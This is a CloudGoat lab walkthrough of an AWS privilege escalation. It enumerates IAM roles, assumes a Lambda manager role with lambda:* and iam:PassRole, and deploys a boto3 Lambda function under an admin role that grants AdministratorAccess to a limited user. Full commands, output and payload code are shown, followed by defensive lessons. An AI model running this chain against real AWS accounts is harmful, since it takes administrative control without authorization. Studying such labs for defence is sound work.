# Lambda Privilege Escalation — CloudGoat

*Weaponizing IAM PassRole and Lambda execution roles to escalate from limited user access to complete administrative privileges*

## Overview

The Lambda Privilege Escalation scenario demonstrates a critical and commonly overlooked vulnerability in AWS permission design: the dangerous combination of **lambda:*** permissions and **iam:PassRole** capabilities. This walkthrough illustrates how an attacker with seemingly limited Lambda management privileges can exploit role assumption chains to escalate into full administrative control.

Understanding this attack is essential because it shows how AWS permissions aren't always about what you can do directly, but what you can make AWS services do on your behalf. Lambda functions execute with the permissions of their assigned IAM role, and if an attacker can create a function and assign it a privileged role, they've effectively become that role. This is a masterclass in privilege escalation through trust relationships and execution contexts.

---

## Setting Up the Lab Environment

### **Launching the CloudGoat Scenario**

Begin by creating the Lambda privilege escalation scenario:

```bash
$ cloudgoat create lambda_privesc
```

This command sets up the vulnerable AWS infrastructure with the necessary roles, policies, and permissions that we'll exploit throughout this walkthrough.

---

## Initial Access and Identity Verification

### **CloudGoat Credentials**

Once the scenario is deployed, CloudGoat provides you with initial credentials for the **chris** user. These credentials give you limited but strategically important permissions.

```
cloudgoat_output_chris_access_key_id = [REDACTED_ACCESS_KEY]
cloudgoat_output_chris_secret_key = [REDACTED_SECRET_KEY]
```

### **Configuring AWS CLI**

Configure the AWS CLI with the provided credentials using a named profile:

```bash
$ aws configure --profile lambdaprivesc
AWS Access Key ID [None]: [REDACTED_ACCESS_KEY]
AWS Secret Access Key [None]: [REDACTED_SECRET_KEY]
Default region name [None]: us-east-1
Default output format [None]: json
```

### **Verifying Your Identity**

Confirm that the credentials are configured correctly and identify your current AWS identity:

```bash
$ aws sts get-caller-identity --profile lambdaprivesc
{
    "UserId": "AIDAXHVUFMEMLEFFEWEEU",
    "Account": "497520304408",
    "Arn": "arn:aws:iam::497520304408:user/chris-cgidix2zyhn4eq"
}
```

**Strategic Context:** You are now operating as **chris-cgidix2zyhn4eq**, a standard IAM user. At this point, your permissions are severely restricted, but they include the specific permissions we need to execute our escalation attack.

---

## IAM Reconnaissance — Mapping the Attack Surface

### **Enumerating All IAM Roles**

The first reconnaissance step is to enumerate all available IAM roles in the AWS account. This reveals the privilege landscape and identifies high-value targets for assumption:

```bash
$ aws iam list-roles --profile lambdaprivesc
{
    "Roles": [
        {
            "Path": "/aws-service-role/resource-explorer-2.amazonaws.com/",
            "RoleName": "AWSServiceRoleForResourceExplorer",
            "RoleId": "AROAXHVUFMEMCA2KUBD7U",
            "Arn": "arn:aws:iam::497520304408:role/aws-service-role/resource-explorer-2.amazonaws.com/AWSServiceRoleForResourceExplorer",
            "CreateDate": "2025-10-06T02:56:25+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "resource-explorer-2.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "cg-debug-role-cgidix2zyhn4eq",
            "RoleId": "AROAXHVUFMEMIZTETJIPU",
            "Arn": "arn:aws:iam::497520304408:role/cg-debug-role-cgidix2zyhn4eq",
            "CreateDate": "2025-11-06T22:30:56+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "Service": "lambda.amazonaws.com"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "CloudGoat debug role",
            "MaxSessionDuration": 3600
        },
        {
            "Path": "/",
            "RoleName": "cg-lambdaManager-role-cgidix2zyhn4eq",
            "RoleId": "AROAXHVUFMEMC2CQVHBLU",
            "Arn": "arn:aws:iam::497520304408:role/cg-lambdaManager-role-cgidix2zyhn4eq",
            "CreateDate": "2025-11-06T22:31:06+00:00",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::497520304408:user/chris-cgidix2zyhn4eq"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "Description": "CloudGoat Lambda manager role",
            "MaxSessionDuration": 3600
        },
        [... remaining AWS managed service roles redacted for brevity]
    ]
}
```

**Critical Discovery:** Two roles are of particular interest:

1. **cg-lambdaManager-role-cgidix2zyhn4eq** — This role has an assume role policy that explicitly allows the **chris-cgidix2zyhn4eq** user to assume it. This is our immediate pivot point.

2. **cg-debug-role-cgidix2zyhn4eq** — This role's trust policy allows Lambda functions to assume it, making it an execution role for Lambda. The description mentions "debug role," which typically implies elevated permissions.

---

## Permission Analysis — Discovering the Escalation Path

### **Examining the Lambda Manager Role Permissions**

Now that we've identified the **cg-lambdaManager-role-cgidix2zyhn4eq** role, let's examine its attached policies to understand what we can do once we assume it:

```bash
$ aws iam get-policy-version --policy-arn arn:aws:iam::497520304408:policy/cg-lambdaManager-policy-cgidix2zyhn4eq --version-id v1 --profile lambdaprivesc
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "lambda:*",
                        "iam:PassRole"
                    ],
                    "Effect": "Allow",
                    "Resource": "*",
                    "Sid": "lambdaManager",
                    "Version": "2012-10-17"
                }
            ]
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2025-11-06T22:30:56+00:00"
    }
}
```

**Strategic Insight:** This is the vulnerability. The policy grants:
- **lambda:*** — Complete control over Lambda functions (create, invoke, update, delete, etc.)
- **iam:PassRole** — The ability to assign any IAM role to a resource

This combination is the escalation vector. We can create a Lambda function and assign it the **cg-debug-role** (which we suspect has high privileges).

### **Examining the Debug Role Permissions**

Let's confirm our suspicion about the debug role's permissions:

```bash
$ aws iam list-attached-role-policies --role-name cg-debug-role-cgidix2zyhn4eq --profile lambdaprivesc
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

**Critical Discovery:** The debug role has **AdministratorAccess** attached to it—the most privileged policy in AWS. This is exactly what we need.

---

## Privilege Escalation — Role Assumption Chain

### **Assuming the Lambda Manager Role**

With the chris user credentials, we can directly assume the **cg-lambdaManager-role-cgidix2zyhn4eq** role:

```bash
$ aws sts assume-role --role-arn arn:aws:iam::497520304408:role/cg-lambdaManager-role-cgidix2zyhn4eq --role-session-name lambdaManager --profile lambdaprivesc
{
    "Credentials": {
        "AccessKeyId": "[REDACTED_ACCESS_KEY]",
        "SecretAccessKey": "[REDACTED_SECRET_KEY]",
        "SessionToken": "[REDACTED_SESSION_TOKEN]",
        "Expiration": "2025-11-07T23:11:08+00:00"
    },
    "AssumedRoleUser": {
        "AssumedRoleId": "AROAXHVUFMEMC2CQVHBLU:lambdaManager",
        "Arn": "arn:aws:sts::497520304408:assumed-role/cg-lambdaManager-role-cgidix2zyhn4eq/lambdaManager"
    }
}
```

**Success:** We now have temporary security credentials for the Lambda Manager role. These credentials include:
- **AccessKeyId** — Temporary access key
- **SecretAccessKey** — Temporary secret key
- **SessionToken** — Session token validating these temporary credentials
- **Expiration** — The credentials expire at the specified time

### **Configuring a New AWS Profile for Lambda Manager**

Configure the AWS CLI with these temporary credentials:

```bash
$ aws configure --profile lambdamanager
AWS Access Key ID [None]: [REDACTED_ACCESS_KEY]
AWS Secret Access Key [None]: [REDACTED_SECRET_KEY]
AWS Session Token [None]: [REDACTED_SESSION_TOKEN]
Default region name [None]: us-east-1
Default output format [None]: json
```

### **Verifying Lambda Manager Identity**

Confirm that we've successfully assumed the Lambda Manager role:

```bash
$ aws sts get-caller-identity --profile lambdamanager
{
    "UserId": "AROAXHVUFMEMC2CQVHBLU:lambdaManager",
    "Account": "497520304408",
    "Arn": "arn:aws:sts::497520304408:assumed-role/cg-lambdaManager-role-cgidix2zyhn4eq/lambdaManager"
}
```

**Confirmation:** We are now operating as the Lambda Manager role with lambda:* and iam:PassRole permissions.

---

## Creating the Malicious Lambda Function

### **Understanding the Attack Payload**

Before we deploy the Lambda function, understand the payload strategy. We'll create a Python Lambda function that uses **boto3** to attach the **AdministratorAccess** policy to the original **chris** user. Since this function will execute with the **cg-debug-role** (which has AdministratorAccess), the function itself will have permission to perform this privileged action.

Here's the Python code we'll deploy as a Lambda function:

```python
import boto3

def lambda_handler(event, context):
    user_name = 'chris-cgidix2zyhn4eq'
    admin_policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
    iam = boto3.client('iam')
    
    try:
        response = iam.attach_user_policy(
            UserName=user_name,
            PolicyArn=admin_policy_arn
        )
        print(f"Success: Admin policy attached to {user_name}")
    except Exception as e:
        print(f"Error attaching policy: {str(e)}")
```

This function:
- Creates an IAM client using **boto3**
- Targets the original **chris-cgidix2zyhn4eq** user
- Attaches the **AdministratorAccess** managed policy to that user
- Returns success or error messages

### **Packaging the Lambda Function**

Create a zip file containing the Lambda function (the file must be named `lambda_function.py`):

```bash
$ zip lambda_function.py.zip lambda_function.py
```

This creates a deployment package that AWS Lambda can execute.

### **Deploying the Lambda Function**

Now create the Lambda function using the `create-function` command. This is where **iam:PassRole** becomes critical—we're passing the **cg-debug-role** as the execution role:

```bash
$ aws lambda create-function --function-name admin_function --runtime python3.9 --role arn:aws:iam::497520304408:role/cg-debug-role-cgidix2zyhn4eq --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdamanager --region us-east-1
{
    "FunctionName": "admin_function",
    "FunctionArn": "arn:aws:lambda:us-east-1:497520304408:function:admin_function",
    "Runtime": "python3.9",
    "Role": "arn:aws:iam::497520304408:role/cg-debug-role-cgidix2zyhn4eq",
    "Handler": "lambda_function.lambda_handler",
    "CodeSize": 441,
    "Description": "",
    "Timeout": 3,
    "MemorySize": 128,
    "LastModified": "2025-11-07T23:32:54.548+0000",
    "CodeSha256": "iNf4UMKZ2yLkWbFn/EDlqlfwmroqvHMc8Iy7AmIsADY=",
    "Version": "$LATEST",
    [... additional metadata fields redacted for brevity]
}
```

**Key Details:** The function is created with:
- **FunctionName**: admin_function
- **Role**: The privileged **cg-debug-role-cgidix2zyhn4eq** (which has AdministratorAccess)
- **Runtime**: Python 3.9
- **Handler**: Points to the lambda_handler function in our code

---

## Executing the Privilege Escalation

### **Invoking the Lambda Function**

Invoke the Lambda function to execute our malicious payload:

```bash
$ aws lambda invoke --function-name admin_function output.json --profile lambdamanager --region us-east-1
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}
```

**Success Indicator:** The **StatusCode: 200** indicates the function executed successfully. The function ran with the permissions of the **cg-debug-role**, which allowed it to attach the **AdministratorAccess** policy to the **chris** user.

---

## Verifying Complete Privilege Escalation

### **Confirming Administrator Access**

Switch back to the original chris profile and verify that AdministratorAccess has been attached:

```bash
$ aws iam list-attached-user-policies --user-name chris-cgidix2zyhn4eq --profile lambdaprivesc
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        },
        {
            "PolicyName": "cg-chris-policy-cgidix2zyhn4eq",
            "PolicyArn": "arn:aws:iam::497520304408:policy/cg-chris-policy-cgidix2zyhn4eq"
        }
    ]
}
```

**Exploitation Complete:** The **chris** user now has **AdministratorAccess** attached, along with their original policy. The chris user can now perform any action in the AWS account—full administrative compromise achieved through the Lambda privilege escalation chain.

---

## Attack Chain Summary

The privilege escalation follows a multi-stage attack chain:

**Stage 1: Initial Foothold** → Limited **chris** user with no direct privileges

**Stage 2: Lateral Movement** → Assume **cg-lambdaManager-role** (allowed by trust policy)

**Stage 3: Function Creation** → Create Lambda function with **iam:PassRole** capability

**Stage 4: Privilege Assumption** → Assign **cg-debug-role** (AdministratorAccess) to the Lambda function

**Stage 5: Exploitation** → Invoke Lambda to execute code as the privileged **cg-debug-role**

**Stage 6: Privilege Escalation** → Lambda attaches AdministratorAccess to original **chris** user

**Stage 7: Full Compromise** → **chris** user now has complete administrative control

---

## Key Takeaways and Security Lessons

This scenario demonstrates critical security principles that apply to real-world AWS environments:

**The Danger of lambda:*** — Granting unrestricted Lambda permissions without careful scoping is equivalent to granting code execution capabilities. Combined with iam:PassRole, it becomes a privilege escalation vector.

**IAM PassRole as a Privilege Amplifier** — The iam:PassRole permission is often overlooked but is incredibly dangerous. It allows users to assign any role they can assume to a resource. Always restrict PassRole to specific roles and verify trust relationships.

**Trust Relationships as Attack Surfaces** — The ability for chris to assume the Lambda Manager role through a trust policy is the starting point. Trust policies should be carefully designed and regularly audited to ensure they only permit necessary principals.

**Lambda Execution Context** — Lambda functions execute with the permissions of their assigned role. A compromised or malicious function can perform any action that role permits. This is why Lambda roles should follow least-privilege principles.

**Principle of Least Privilege Violations** — The chris user shouldn't have been able to assume a role with lambda:* and iam:PassRole. Service roles should be strictly scoped to only the permissions needed for their intended purpose.

**Defense in Depth** — None of this escalation would be possible if the debug role didn't have AdministratorAccess, or if chris couldn't assume the Lambda Manager role in the first place. Defense requires multiple layers of proper permission design.